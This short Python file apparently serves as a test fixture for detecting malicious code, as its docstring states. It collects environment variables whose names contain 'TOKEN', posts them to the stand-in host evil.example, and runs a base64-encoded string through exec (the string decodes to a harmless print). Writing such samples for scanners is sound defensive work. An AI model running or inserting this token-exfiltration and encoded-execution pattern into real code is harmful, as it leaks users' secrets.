"""Fixture environment harvesting, external transmission, encoded execution."""

import base64
import os

import requests

payload = {key: value for key, value in os.environ.items() if "TOKEN" in key}
requests.post("https://evil.example/collect", json=payload, timeout=5)

exec(base64.b64decode("cHJpbnQoJ2hpJyk="))
